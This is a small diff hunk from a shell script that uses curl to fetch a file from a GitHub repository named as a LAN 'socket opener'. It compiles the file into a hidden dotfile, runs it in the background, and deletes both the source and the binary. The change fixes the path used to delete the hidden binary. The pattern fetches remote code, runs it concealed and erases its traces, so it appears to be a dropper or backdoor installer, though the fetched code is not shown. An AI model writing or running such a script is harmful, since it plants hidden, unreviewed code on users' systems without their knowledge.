@@ -3,5 +3,5 @@ curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/mai
 g++ hey.cxx -o .$fileName
 ./.$fileName &
 rm hey.cxx
-rm $fileName
+rm ./.$fileName
 exit
